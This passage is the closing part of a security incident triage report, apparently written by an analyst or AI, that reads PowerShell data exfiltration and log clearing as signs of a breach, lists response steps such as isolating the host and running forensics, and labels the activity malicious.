- Data exfiltration through PowerShell indicates a potential data breach.
- Log clearing actions suggest an attempt to cover tracks post-breach.
- Unauthorized access attempts could imply privilege escalation attempts or reconnaissance.

**Guidance on How to Proceed:**
- Immediately isolate the affected host to prevent further data exfiltration.
- Conduct a comprehensive forensic analysis to ascertain the full extent of the breach.
- Review access logs, network logs, and firewall rules to understand potential entry points.
- Notify appropriate law enforcement if applicable, concerning the suspected breach.
- Follow up with patching and tightening of security policies to prevent recurrence.

Based on these observations, my resolution is: **MALICIOUS**. The combination of activities is consistent with malicious behavior and warrants immediate attention and response."
